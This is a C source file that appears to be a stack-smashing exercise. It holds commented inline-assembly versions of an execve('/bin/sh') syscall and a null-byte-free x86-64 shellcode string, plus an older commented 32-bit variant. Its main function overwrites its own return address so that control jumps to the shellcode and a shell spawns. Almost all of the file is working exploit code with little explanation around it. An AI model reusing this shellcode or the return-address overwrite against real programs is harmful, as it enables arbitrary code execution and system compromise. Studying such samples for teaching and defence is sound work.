/*int main() {
  __asm__(
    "mov    $0x0,%rdx\n\t"                // arg 3 = NULL
    "mov    $0x0,%rsi\n\t"                // arg 2 = NULL
    "mov    $0x0068732f6e69622f,%rdi\n\t"
    "push   %rdi\n\t"                     // push "/bin/sh" onto stack
    "mov    %rsp,%rdi\n\t"                // arg 1 = stack pointer = start of /bin/sh
    "mov    $0x3b,%rax\n\t"               // syscall number = 59
    "syscall\n\t"
  );
}*/

/*int main() {
  __asm__(
    "xor    %rdx,%rdx\n\t"                // arg 3 = NULL
    "mov    %rdx,%rsi\n\t"                // arg 2 = NULL
    "mov    $0x1168732f6e69622f,%rdi\n\t"
    "shl    $0x8,%rdi\n\t"                
    "shr    $0x8,%rdi\n\t"                // first byte = 0 (8 bits)
    "push   %rdi\n\t"                     // push "/bin/sh" onto stack
    "mov    %rsp,%rdi\n\t"                // arg 1 = stack ptr = start of /bin/sh
    "mov    $0x111111111111113b,%rax\n\t" // syscall number = 59
    "shl    $0x38,%rax\n\t"         
    "shr    $0x38,%rax\n\t"               // first 7 bytes = 0 (56 bits)
    "syscall\n\t"
  );
}*/
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#define CODEBUF 100

char shellcode[] =
	//"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
	//"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
	//"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
	//"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
	"\x48\x31\xd2\x48\x89\xd6\x48\xbf"
	"\x2f\x62\x69\x6e\x2f\x73\x68\x11"
	"\x48\xc1\xe7\x08\x48\xc1\xef\x08"
	"\x57\x48\x89\xe7\x48\xb8\x3b\x11"
	"\x11\x11\x11\x11\x11\x11\x48\xc1"
	"\xe0\x38\x48\xc1\xe8\x38\x0f\x05";

void main() {
   unsigned long long  *ret;
   char codestring[CODEBUF];
   strcpy(codestring, shellcode);
   ret = (unsigned long long *)&ret + 2;
   (*ret) = (unsigned long long)shellcode;
   return;
}
